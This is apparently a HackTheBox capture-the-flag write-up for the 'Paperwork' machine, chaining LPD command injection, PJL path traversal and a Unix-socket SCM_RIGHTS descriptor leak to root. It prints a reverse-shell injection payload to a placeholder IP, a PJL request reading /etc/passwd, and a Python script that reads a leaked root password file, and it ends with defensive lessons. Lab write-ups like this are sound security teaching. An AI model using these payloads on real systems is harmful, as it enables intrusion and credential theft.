---
title: "Paperwork — HackTheBox Writeup"
date: 2026-07-14
authors:
  - pexpo
categories:
  - Web Exploitation
  - Linux
tags:
  - easy
  - lpd
  - pjl
  - command-injection
  - path-traversal
  - scm-rights
  - unix-socket
  - htb
slug: paperwork
description: "LPD shell=True command injection → PJL path traversal arbitrary R/W → SCM_RIGHTS fd leak over Unix socket → admin password → root"
---

# Paperwork — HackTheBox Writeup
**Difficulty:** Easy | **OS:** Linux

<!-- more -->

## Overview

Paperwork is built entirely around custom printer protocol implementations with no CVEs involved. Three bugs in from-scratch Python services chain to root: LPD command injection, PJL path traversal, and a Unix-socket `SCM_RIGHTS` file-descriptor leak.

**Chain:** LPD `shell=True` job name injection → RCE as lp → PJL path traversal arbitrary R/W → SSH as archivist → user flag → log-triggered `SCM_RIGHTS` fd leak → root-owned file descriptor → admin password → root

---

## Recon

Three ports: 22, 80 (nginx — Document Archiving Service), 1515 (custom LPD service, `Archive_Printer`). The web root exposed `paperwork-archive-v1.02.zip` containing `server.py` — a clear signal that source review was the intended path.

---

## Foothold — LPD Command Injection

`server.py` extracts the job name from a `J`-prefixed line in the LPD control file and passes it unsanitised into a `shell=True` subprocess:

```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

Single-quote breakout in the job name gives full command injection:

```
J x'; bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'; echo '
```

Speak the LPD framing over raw socket — command byte `\x02`, queue name, subcommand header, control file content — and the shell arrives as `lp`.

---

## Lateral Movement — PJL Path Traversal

From the `lp` shell, `ss -tlnp` shows `127.0.0.1:9100` — a PJL service running as `archivist`, source at `/home/archivist/printer/jetdirect.py`.

The path translation function strips the `0:` volume prefix and normalizes but never verifies the result stays inside the intended root:

```python
def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))
```

`FSUPLOAD` (read) and `FSDOWNLOAD` (write) both route through this. Arbitrary file read:

```
@PJL FSUPLOAD NAME="0:\..\..\..\etc\passwd" OFFSET=0 SIZE=2000
```

Write a public key into archivist's `authorized_keys` via `FSDOWNLOAD`, SSH in, read user flag.

---

## Privesc — SCM_RIGHTS File Descriptor Leak

A root-owned daemon listens on `/run/paperwork/mgmt.sock` (`root:archivist`, mode `660`). It opens `/etc/paperwork/admin_pins.conf` at startup and keeps the fd alive. When `FSUPLOAD`, `FSQUERY`, or `FSDOWNLOAD` appears in the archivist-writable commands log, it sends **both** the log fd and the `admin_pins.conf` fd to any connecting client via `SCM_RIGHTS` — no real authentication, just a log-string check.

```bash
echo "FSUPLOAD" >> /home/archivist/printer/logs/commands.log
```

```python
import socket, array, os
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")
s.send(b"\n")
fds = array.array("i")
msg, ancdata, _, _ = s.recvmsg(4096, socket.CMSG_SPACE(2 * fds.itemsize))
for level, type_, data in ancdata:
    if level == socket.SOL_SOCKET and type_ == socket.SCM_RIGHTS:
        fds.frombytes(data[:len(data)-(len(data)%fds.itemsize)])
for fd in fds:
    print(os.pread(fd, 4096, 0).decode(errors='ignore'))
```

`os.pread()` bypasses on-disk permissions — the check happened at `open()` time when the daemon opened the file as root. The output is `admin_pins.conf` containing the root password. `su -` → root.

---

## Things I Learned

**Source review over tool spray.** Every step came from reading the code — no CVE, no Metasploit. The server zip was right there on the web root.

**`shell=True` with string interpolation is always injectable.** The moment you see `subprocess.Popen(f"...{user_input}...", shell=True)`, assume injection. Single-quote "escaping" in bash is not sanitisation.

**`os.path.normpath` doesn't sandbox paths.** It resolves `..` but doesn't verify the result stays inside any root. Always check `result.startswith(root)` after normalization.

**`SCM_RIGHTS` is a real privesc primitive.** File descriptors passed over Unix sockets bypass on-disk permissions — the check happens at `open()`, not `read()`. A privileged daemon leaking an open fd to a lower-privileged client is a complete privesc.

---

*Pexpo | HTB | 14 Jul 2026*
